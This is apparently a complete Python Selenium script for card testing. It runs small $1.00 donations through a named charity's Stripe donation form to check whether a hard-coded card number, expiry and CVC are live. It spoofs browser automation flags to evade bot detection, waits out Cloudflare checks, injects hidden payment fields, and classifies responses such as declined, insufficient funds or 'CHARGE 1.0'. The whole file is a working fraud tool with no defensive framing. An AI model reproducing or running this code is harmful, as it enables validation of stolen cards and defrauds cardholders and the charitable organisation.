import time
import re
import json
import random
import os
import sys


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

TARGET_URL = 'https://goodhope.org/giving/?form-id=12124&payment-mode=stripe&level-id=custom&custom-amount=1.00'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


def setup_driver():
    """إعداد Chrome Driver - Regular Selenium"""
    print("🚀 Setting up driver...")
    
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    
    options = Options()
    options.binary_location = '/usr/bin/chromium'
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--headless=new')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    options.add_argument(
        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
    )
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    prefs = {
        "profile.managed_default_content_settings.images": 2,
        "profile.default_content_setting_values.notifications": 2,
    }
    options.add_experimental_option("prefs", prefs)
    
    if os.path.exists('/usr/bin/chromedriver'):
        print("✅ Using system chromedriver")
        service = Service('/usr/bin/chromedriver')
        driver = webdriver.Chrome(service=service, options=options)
    else:
        print("⚠️ Using default chromedriver")
        driver = webdriver.Chrome(options=options)
    
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
    driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
    
    driver.set_page_load_timeout(30)
    driver.set_script_timeout(30)
    
    print("✅ Driver launched")
    return driver


def run():
    print("=" * 60)
    print("🎯 STARTING CHECK")
    print(f"🔗 URL: {TARGET_URL}")
    print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
    print("=" * 60)
    
    driver = None
    try:
        # Setup
        driver = setup_driver()
        
        # Open page
        print(f"\n🌐 Opening page...")
        driver.get(TARGET_URL)
        
        # Wait for page
        print("⏳ Waiting for page...")
        max_wait = 60
        start = time.time()
        page_ready = False
        
        while time.time() - start < max_wait:
            try:
                html = driver.page_source
                html_lower = html.lower()
                
                if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                    elapsed = int(time.time() - start)
                    print(f"   ⏳ Cloudflare... ({elapsed}s)")
                    time.sleep(2)
                    continue
                
                if 'give-form-id' in html or 'pk_live_' in html or 'stripe' in html_lower:
                    page_ready = True
                    print(f"✅ Page ready after {int(time.time() - start)}s")
                    break
                
                time.sleep(1)
            except:
                time.sleep(1)
        
        if not page_ready:
            return "PAGE_LOAD_TIMEOUT"
        
        # Extract data
        html = driver.page_source
        print(f"📄 HTML Length: {len(html)}")
        print(f"📍 Title: {driver.title}")
        
        form_id = '12124'
        form_hash = None
        form_prefix = '12124-1'
        stripe_key = None
        
        # Try to find in HTML
        m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
        if m:
            form_hash = m.group(1)
        
        if not form_hash:
            m = re.search(r'give-form-hash["\']?\s*[:=]\s*["\']([a-f0-9]+)', html)
            if m:
                form_hash = m.group(1)
        
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        # Fallback
        if not form_hash:
            form_hash = '54fcc028ca'
        if not stripe_key:
            stripe_key = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        # Generate Stripe PM
        print("\n💳 Generating Stripe PM...")
        
        stripe_js = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        
        (async () => {
            try {
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                if (typeof Stripe === 'undefined') {
                    callback(JSON.stringify({error: 'Stripe.js not available'}));
                    return;
                }
                
                const stripe = Stripe(stripeKey);
                
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: {
                        number: cardNum,
                        exp_month: parseInt(expM),
                        exp_year: parseInt(expY),
                        cvc: cvc
                    },
                    billing_details: {
                        name: 'James Smith',
                        email: 'james.smith@gmail.com',
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            result_raw = driver.execute_async_script(
                stripe_js,
                stripe_key,
                CARD_NUMBER,
                EXP_MONTH,
                EXP_YEAR,
                CVC
            )
            
            print(f"📥 Stripe: {result_raw[:400]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                if decline:
                    return f"STRIPE_{decline.upper()}"
                if code:
                    return f"STRIPE_{code.upper()}"
                
                if 'insufficient' in error.lower():
                    return "INSUFFICIENT_FUNDS"
                if 'declined' in error.lower():
                    return "DECLINED"
                
                return f"STRIPE_ERROR: {error[:100]}"
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM: {pm_id}")
            
            # Fill form + submit
            print("\n💸 Filling form + submitting...")
            
            fill_js = """
            var callback = arguments[arguments.length - 1];
            var args = arguments;
            
            try {
                // Fill amount
                var amtInput = document.querySelector('[name="give-amount"]');
                if (amtInput) {
                    amtInput.value = '1.00';
                    amtInput.dispatchEvent(new Event('input', {bubbles: true}));
                }
                
                // Fill first name
                var fnInput = document.querySelector('[name="give_first"]');
                if (fnInput) {
                    fnInput.value = args[0];
                    fnInput.dispatchEvent(new Event('input', {bubbles: true}));
                }
                
                // Fill last name
                var lnInput = document.querySelector('[name="give_last"]');
                if (lnInput) {
                    lnInput.value = args[1];
                    lnInput.dispatchEvent(new Event('input', {bubbles: true}));
                }
                
                // Fill email
                var emInput = document.querySelector('[name="give_email"]');
                if (emInput) {
                    emInput.value = args[2];
                    emInput.dispatchEvent(new Event('input', {bubbles: true}));
                }
                
                // Set payment method
                var pmInput = document.querySelector('[name="give_stripe_payment_method"]');
                if (!pmInput) {
                    pmInput = document.createElement('input');
                    pmInput.type = 'hidden';
                    pmInput.name = 'give_stripe_payment_method';
                    document.body.appendChild(pmInput);
                }
                pmInput.value = args[3];
                
                // Set give_action
                var actionInput = document.querySelector('[name="give_action"]');
                if (!actionInput) {
                    actionInput = document.createElement('input');
                    actionInput.type = 'hidden';
                    actionInput.name = 'give_action';
                    document.body.appendChild(actionInput);
                }
                actionInput.value = 'purchase';
                
                // Set gateway
                var gwInput = document.querySelector('[name="give-gateway"]');
                if (!gwInput) {
                    gwInput = document.createElement('input');
                    gwInput.type = 'hidden';
                    gwInput.name = 'give-gateway';
                    document.body.appendChild(gwInput);
                }
                gwInput.value = 'stripe';
                
                callback(JSON.stringify({success: true}));
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
            """
            
            fill_result = driver.execute_async_script(
                fill_js,
                FIRST_NAME,
                LAST_NAME,
                EMAIL,
                pm_id
            )
            print(f"📝 Fill result: {fill_result}")
            
            # Try to submit
            print("\n🖱️ Submitting...")
            
            submit_js = """
            try {
                // Find submit button
                var submitBtn = document.querySelector('button[type="submit"]') ||
                                document.querySelector('input[type="submit"]') ||
                                document.querySelector('.give-submit') ||
                                document.querySelector('[class*="submit"]');
                
                if (submitBtn) {
                    submitBtn.click();
                    return 'clicked_button';
                }
                
                // Or submit the form directly
                var form = document.querySelector('form[id*="give-form"]') || 
                           document.querySelector('form.give-form') ||
                           document.querySelector('form');
                
                if (form) {
                    form.submit();
                    return 'submitted_form';
                }
                
                return 'no_form_or_button';
            } catch (e) {
                return 'error: ' + e.message;
            }
            """
            
            submit_result = driver.execute_script("return " + submit_js)
            print(f"🖱️ Submit result: {submit_result}")
            
            # Wait for result
            print("\n⏳ Waiting for result...")
            
            result_text = ""
            max_wait_result = 25
            start_result = time.time()
            
            while time.time() - start_result < max_wait_result:
                try:
                    text_now = driver.find_element("tag name", "body").text
                    text_lower = text_now.lower()
                    
                    live_keywords = [
                        'insufficient', 'declined', 'expired',
                        'fraud', 'do not honor', 'do_not_honor',
                        'thank you', 'success', 'complete',
                        'failed', 'card_error', 'processing_error'
                    ]
                    
                    for kw in live_keywords:
                        if kw in text_lower:
                            result_text = text_now
                            break
                    
                    if result_text:
                        break
                    
                    time.sleep(1)
                except:
                    time.sleep(1)
            
            if result_text:
                return parse_result(result_text, driver.page_source)
            
            return "NO_RESULT"
        
        except Exception as e:
            return f"Error: {str(e)[:200]}"
    
    except Exception as e:
        return f"Fatal: {str(e)[:200]}"
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def parse_result(text, html=""):
    text_lower = text.lower()
    html_lower = html.lower()
    
    responses = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'do not honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
    }
    
    for kw, resp in responses.items():
        if kw in text_lower:
            return resp
    
    for kw, resp in responses.items():
        if kw in html_lower:
            return resp
    
    if text.strip():
        return f"UNKNOWN: {' '.join(text.split())[:200]}"
    
    return "NO_RESULT"


if __name__ == '__main__':
    result = run()
    print("\n" + "=" * 60)
    print(f"📊 FINAL: {result}")
    print("=" * 60)
